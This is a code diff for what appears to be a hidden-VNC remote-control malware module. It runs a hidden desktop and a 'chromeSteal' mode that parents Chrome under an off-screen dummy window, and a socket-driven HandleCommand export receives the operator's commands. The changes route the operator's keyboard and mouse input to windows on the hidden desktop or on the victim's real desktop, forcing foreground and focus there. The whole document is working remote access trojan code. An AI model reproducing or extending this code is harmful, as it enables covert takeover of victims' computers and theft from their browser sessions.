@@ -828,6 +828,16 @@ static POINT screen_pt(int normX, int normY) {
     return pt;
 }
 
+static POINT virtual_to_real_screen(POINT virtualPt) {
+    if (!g_hChromeDummyParent) return virtualPt;
+    RECT rc;
+    GetWindowRect(g_hChromeDummyParent, &rc);
+    POINT realPt;
+    realPt.x = rc.left + virtualPt.x;
+    realPt.y = rc.top + virtualPt.y;
+    return realPt;
+}
+
 static UINT mouse_message_for_button(int btn, bool down, bool dblClick = false) {
     if (btn == 1) return down ? WM_RBUTTONDOWN : WM_RBUTTONUP;
     if (btn == 2) return down ? WM_MBUTTONDOWN : WM_MBUTTONUP;
@@ -842,18 +852,14 @@ static WPARAM mouse_wparam_for_button(int btn, bool down) {
     return MK_LBUTTON;
 }
 
-static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt, bool isVirtual = false) {
+static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
     HWND current = hwnd;
     HWND best = hwnd;
 
     while (current && IsWindow(current)) {
         best = current;
         POINT clientPt = screenPt;
-        if (isVirtual && current == hwnd) {
-            // Already in client coords for the root virtual window
-        } else {
-            if (!ScreenToClient(current, &clientPt)) break;
-        }
+        if (!ScreenToClient(current, &clientPt)) break;
 
         HWND child = ChildWindowFromPoint(current, clientPt);
         if (!child || child == current) {
@@ -861,11 +867,8 @@ static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt, bool isVi
         }
         if (!child || child == current || !IsWindow(child)) break;
 
-        // For virtual windows, we can't use GetWindowRect check easily as they are off-screen
-        if (!isVirtual) {
-            RECT childRect;
-            if (!GetWindowRect(child, &childRect) || !PtInRect(&childRect, screenPt)) break;
-        }
+        RECT childRect;
+        if (!GetWindowRect(child, &childRect) || !PtInRect(&childRect, screenPt)) break;
 
         current = child;
         // After the first level, it's all relative to the parent anyway,
@@ -881,6 +884,34 @@ static HWND target_window_from_screen_point(POINT screenPt) {
     HWND hwnd = WindowFromPoint(screenPt);
     if (!hwnd || !IsWindow(hwnd)) return NULL;
     return resolve_child_window_from_point(hwnd, screenPt);
+}
+
+static HWND get_target_window_and_desktop(POINT hVncPt, HDESK& hTargetDesktop, POINT& outRealPt) {
+    hTargetDesktop = g_hHiddenDesktop;
+    outRealPt = hVncPt;
+
+    if (g_chromeStealRunning && g_hChromeDummyParent) {
+        POINT realPt = virtual_to_real_screen(hVncPt);
+        HDESK hCurrent = GetThreadDesktop(GetCurrentThreadId());
+
+        SetThreadDesktop(g_hDefaultDesktop);
+        HWND hwnd = resolve_child_window_from_point(g_hChromeDummyParent, realPt);
+        SetThreadDesktop(hCurrent);
+
+        if (hwnd && hwnd != g_hChromeDummyParent) {
+            hTargetDesktop = g_hDefaultDesktop;
+            outRealPt = realPt;
+            return hwnd;
+        }
+    }
+
+    // Default to Hidden Desktop
+    HDESK hCurrent = GetThreadDesktop(GetCurrentThreadId());
+    SetThreadDesktop(g_hHiddenDesktop);
+    HWND hwnd = target_window_from_screen_point(hVncPt);
+    SetThreadDesktop(hCurrent);
+
+    return hwnd;
 }
 
 static bool post_mouse_to_window(HWND hwnd, POINT screenPt, UINT msg, WPARAM wParam) {
@@ -949,10 +980,6 @@ static HWND GetFocusedWindow() {
 //  input_loop – Klavye ve Mouse etkileşim iyileştirmeleri
 // -----------------------------------------------------------------------
 static void input_loop() {
-    // Input loop handles redirection. We don't force SetThreadDesktop here anymore
-    // because some windows might be on Default and some on Hidden.
-    // ensure_desktop();
-
     while (g_inputRunning) {
         InputTask task;
         {
@@ -966,49 +993,58 @@ static void input_loop() {
         const string& action = task.action;
         const json&   cmd    = task.cmd;
 
+        int normX = cmd.value("x", -1);
+        int normY = cmd.value("y", -1);
+        POINT hVncPt = {0, 0};
+        if (normX != -1 && normY != -1) {
+            hVncPt = screen_pt(normX, normY);
+            g_lastMousePos = hVncPt;
+        } else {
+            hVncPt = g_lastMousePos;
+        }
+
+        HDESK hTargetDesktop = NULL;
+        POINT targetPt = {0, 0};
+        HWND hTarget = get_target_window_and_desktop(hVncPt, hTargetDesktop, targetPt);
+
+        if (!hTarget) {
+            if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
+                hTarget = GetFocusedWindow(); // Fallback for keys
+            }
+            if (!hTarget) continue;
+        }
+
+        HDESK hCurrent = GetThreadDesktop(GetCurrentThreadId());
+        if (hTargetDesktop) SetThreadDesktop(hTargetDesktop);
+
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = NULL;
 
-            if (g_chromeStealRunning && g_hChromeDummyParent) {
-                {
-                    lock_guard<mutex> lock(g_chromeCaptureMutex);
-                    hTarget = g_hChromeLastCapturedChild; // Use the last captured child for focus/keys
-                }
-                if (!hTarget) hTarget = resolve_child_window_from_point(g_hChromeDummyParent, g_lastMousePos, true);
+            if (hTargetDesktop == g_hDefaultDesktop) {
+                SetForegroundWindow(hTarget);
+                SetFocus(hTarget);
             }
-
-            if (!hTarget || !IsWindow(hTarget)) hTarget = target_window_from_screen_point(g_lastMousePos);
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
-            if (!hTarget || !IsWindow(hTarget)) continue;
 
             if (action == "hvnc_keydown") {
                 PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
             } else if (action == "hvnc_keyup") {
                 PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
             } else if (action == "hvnc_char") {
-                // Doğrudan WM_CHAR post et
-                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);  // lParam genelde 1 (repeat count)
+                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             }
             g_forceFullFrame = true;
-            continue;
         }
-
         // ---- Mouse ----
-        if (action.find("hvnc_mouse") == string::npos && action != "hvnc_doubleclick") continue;
-
-        int normX = cmd.value("x", 0);
-        int normY = cmd.value("y", 0);
-        POINT screenPt = screen_pt(normX, normY);
-        g_lastMousePos = screenPt;
-
-        if (action == "hvnc_mousemove") {
+        else if (action == "hvnc_mousemove") {
             g_forceFullFrame = true;
-            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE);
+            if (hTargetDesktop == g_hHiddenDesktop) {
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE);
+            }
+
             if (g_dragging && g_dragHwnd) {
-                int dx = screenPt.x - g_dragStartPt.x;
-                int dy = screenPt.y - g_dragStartPt.y;
+                int dx = hVncPt.x - g_dragStartPt.x;
+                int dy = hVncPt.y - g_dragStartPt.y;
 
                 if (g_dragHitTest == HTCAPTION) {
                     int newX = g_dragStartRect.left + dx;
@@ -1038,178 +1074,129 @@ static void input_loop() {
                 }
 
             } else {
-                HWND hwnd = NULL;
-                if (g_chromeStealRunning && g_hChromeDummyParent) {
-                    hwnd = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
-                }
-                if (!hwnd) hwnd = WindowFromPoint(screenPt);
-
-                if (hwnd) {
+                if (hTarget) {
                     LRESULT ht = HTCLIENT;
-                    if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
+                    if (SendMessageTimeoutW(hTarget, WM_NCHITTEST, 0, MAKELPARAM(targetPt.x, targetPt.y),
                                           SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) {
-                        // Provide cursor feedback
-                        SendMessageTimeoutW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE),
+                        SendMessageTimeoutW(hTarget, WM_SETCURSOR, (WPARAM)hTarget, MAKELPARAM(ht, WM_MOUSEMOVE),
                                           SMTO_ABORTIFHUNG, 200, NULL);
                     }
                 }
             }
-            continue;
         }
-
-        if (action == "hvnc_mousedown") {
+        else if (action == "hvnc_mousedown") {
             g_forceFullFrame = true;
-            int  btn  = cmd.value("button", 0);
+            int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
 
-            HWND hwnd = NULL;
-            if (g_chromeStealRunning && g_hChromeDummyParent) {
-                hwnd = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
-            }
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
-            if (!hwnd) continue;
-
-            HWND hRoot = (g_chromeStealRunning && g_hChromeDummyParent && (hwnd == g_hChromeDummyParent || GetParent(hwnd) == g_hChromeDummyParent))
-                         ? g_hChromeDummyParent : GetAncestor(hwnd, GA_ROOT);
+            HWND hRoot = GetAncestor(hTarget, GA_ROOT);
             g_hLastWindow = hRoot;
 
             LRESULT ht = HTCLIENT;
-            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
+            SendMessageTimeoutW(hTarget, WM_NCHITTEST, 0, MAKELPARAM(targetPt.x, targetPt.y),
                                 SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
 
             UINT mouseMsg = mouse_message_for_button(btn, true);
 
-            SetWindowPos(hRoot, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
+            if (hTargetDesktop == g_hHiddenDesktop) {
+                SetWindowPos(hRoot, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
+            }
 
             if (ht != HTCLIENT) {
                 if (btn == 0) {
-                    if (ht == HTCLOSE) {
-                        PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0);
-                        continue;
-                    } else if (ht == HTMINBUTTON) {
-                        PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0);
-                        continue;
-                    } else if (ht == HTMAXBUTTON) {
+                    if (ht == HTCLOSE) PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0);
+                    else if (ht == HTMINBUTTON) PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0);
+                    else if (ht == HTMAXBUTTON) {
                         WINDOWPLACEMENT wp = { sizeof(wp) };
                         GetWindowPlacement(hRoot, &wp);
-                        if (wp.showCmd == SW_SHOWMAXIMIZED)
-                            PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
-                        else
-                            PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
-                        continue;
+                        if (wp.showCmd == SW_SHOWMAXIMIZED) PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
+                        else PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                     }
                 }
-
-                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                if (hTargetDesktop == g_hHiddenDesktop) {
+                    send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                }
 
                 if (btn == 0 && (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT ||
                                  ht == HTTOP || ht == HTBOTTOM || ht == HTTOPLEFT ||
                                  ht == HTTOPRIGHT || ht == HTBOTTOMLEFT || ht == HTBOTTOMRIGHT)) {
                     g_dragging = true;
                     g_dragHwnd = hRoot;
-                    g_dragStartPt = screenPt;
+                    g_dragStartPt = hVncPt;
                     g_dragHitTest = ht;
                     GetWindowRect(hRoot, &g_dragStartRect);
                 }
             } else {
-                HWND hTarget = target_window_from_screen_point(screenPt);
-                if (!hTarget) hTarget = hwnd;
+                if (hTargetDesktop == g_hDefaultDesktop) {
+                    SetForegroundWindow(hTarget);
+                    SetFocus(hTarget);
+                }
                 activate_target_window(hTarget, mouseMsg, ht);
                 g_hCurrentFocus = hTarget;
-                POINT clientPt = screenPt;
-                ScreenToClient(hTarget, &clientPt);
-
                 g_mouseDownTarget[btn] = hTarget;
-                post_mouse_to_window(hTarget, screenPt, mouseMsg, mouse_wparam_for_button(btn, true));
+                post_mouse_to_window(hTarget, targetPt, mouseMsg, mouse_wparam_for_button(btn, true));
             }
-            continue;
         }
-
-        if (action == "hvnc_mouseup") {
+        else if (action == "hvnc_mouseup") {
             g_forceFullFrame = true;
-            int  btn = cmd.value("button", 0);
+            int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
             if (btn == 0 && g_dragging) {
-                g_dragging  = false;
-                g_dragHwnd  = NULL;
+                g_dragging = false;
+                g_dragHwnd = NULL;
             }
-
-            HWND hwnd = NULL;
-            if (g_chromeStealRunning && g_hChromeDummyParent) {
-                hwnd = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
-            }
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
-            if (!hwnd) continue;
 
             LRESULT ht = HTCLIENT;
-            if (hwnd != g_hChromeDummyParent) {
-                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
-            }
+            SendMessageTimeoutW(hTarget, WM_NCHITTEST, 0, MAKELPARAM(targetPt.x, targetPt.y),
+                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
 
             if (ht != HTCLIENT) {
-                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
-            } else {
-                HWND hTarget = g_mouseDownTarget[btn];
-                if (!hTarget || !IsWindow(hTarget)) {
-                    if (g_chromeStealRunning && g_hChromeDummyParent) {
-                        hTarget = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
-                    }
-                    if (!hTarget) hTarget = target_window_from_screen_point(screenPt);
+                if (hTargetDesktop == g_hHiddenDesktop) {
+                    send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
                 }
-                if (!hTarget) hTarget = hwnd;
+            } else {
+                HWND hDownTarget = g_mouseDownTarget[btn];
+                if (!hDownTarget || !IsWindow(hDownTarget)) hDownTarget = hTarget;
 
-                POINT clientPt = screenPt;
-                ScreenToClient(hTarget, &clientPt);
-
-                post_mouse_to_window(hTarget, screenPt, mouse_message_for_button(btn, false), mouse_wparam_for_button(btn, false));
+                if (hTargetDesktop == g_hDefaultDesktop) {
+                    SetForegroundWindow(hDownTarget);
+                    SetFocus(hDownTarget);
+                }
+                post_mouse_to_window(hDownTarget, targetPt, mouse_message_for_button(btn, false), mouse_wparam_for_button(btn, false));
                 g_mouseDownTarget[btn] = NULL;
             }
-            continue;
         }
-
-        if (action == "hvnc_doubleclick") {
+        else if (action == "hvnc_doubleclick") {
             g_forceFullFrame = true;
             int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
 
-            HWND hwnd = NULL;
-            if (g_chromeStealRunning && g_hChromeDummyParent) {
-                hwnd = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
-            }
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
-            if (!hwnd) continue;
-
             LRESULT ht = HTCLIENT;
-            if (hwnd != g_hChromeDummyParent) {
-                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
-            }
+            SendMessageTimeoutW(hTarget, WM_NCHITTEST, 0, MAKELPARAM(targetPt.x, targetPt.y),
+                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
 
             if (ht == HTCLIENT) {
-                HWND hTarget = NULL;
-                if (g_chromeStealRunning && g_hChromeDummyParent) {
-                    hTarget = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
+                if (hTargetDesktop == g_hDefaultDesktop) {
+                    SetForegroundWindow(hTarget);
+                    SetFocus(hTarget);
                 }
-                if (!hTarget) hTarget = target_window_from_screen_point(screenPt);
-                if (!hTarget) hTarget = hwnd;
                 activate_target_window(hTarget, mouse_message_for_button(btn, true, btn == 0), ht);
-
-                POINT clientPt = screenPt;
-                ScreenToClient(hTarget, &clientPt);
 
                 UINT downMsg = mouse_message_for_button(btn, true);
                 UINT upMsg = mouse_message_for_button(btn, false);
                 UINT dblMsg = mouse_message_for_button(btn, true, btn == 0);
-                post_mouse_to_window(hTarget, screenPt, downMsg, mouse_wparam_for_button(btn, true));
-                post_mouse_to_window(hTarget, screenPt, upMsg, mouse_wparam_for_button(btn, false));
-                post_mouse_to_window(hTarget, screenPt, dblMsg, mouse_wparam_for_button(btn, true));
-                post_mouse_to_window(hTarget, screenPt, upMsg, mouse_wparam_for_button(btn, false));
+                post_mouse_to_window(hTarget, targetPt, downMsg, mouse_wparam_for_button(btn, true));
+                post_mouse_to_window(hTarget, targetPt, upMsg, mouse_wparam_for_button(btn, false));
+                post_mouse_to_window(hTarget, targetPt, dblMsg, mouse_wparam_for_button(btn, true));
+                post_mouse_to_window(hTarget, targetPt, upMsg, mouse_wparam_for_button(btn, false));
             }
-            continue;
         }
+
+        if (hTargetDesktop) SetThreadDesktop(hCurrent);
     }
 }
+
+
 
 static wstring GetChromePath() {
     WCHAR path[MAX_PATH];
@@ -1243,6 +1230,7 @@ static void dummy_parent_worker() {
     int sh = GetSystemMetrics(SM_CYSCREEN);
 
     // Create the window off-screen but "visible" so PrintWindow works
+    AllowSetForegroundWindow(ASFW_ANY);
     g_hChromeDummyParent = CreateWindowExW(WS_EX_TOOLWINDOW | WS_EX_TOPMOST | WS_EX_LAYERED, wc.lpszClassName, L"Chrome Dummy Parent", WS_POPUP,
                                            -sw - 100, -sh - 100, sw, sh,
                                            NULL, NULL, wc.hInstance, NULL);
@@ -1347,13 +1335,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (!g_inputRunning.exchange(true)) {
                 if (g_inputThread.joinable()) g_inputThread.join();
 
-                // Set desktop to hidden for the input thread to ensure it can interact with hidden desktop by default
-                // though individual redirections will handle default desktop windows.
-                g_inputThread = thread([]() {
-                    ensure_desktop();
-                    if (g_hHiddenDesktop) SetThreadDesktop(g_hHiddenDesktop);
-                    input_loop();
-                });
+                g_inputThread = thread(input_loop);
             }
         } else if (action == "hvnc_stop") {
             g_captureRunning = false;
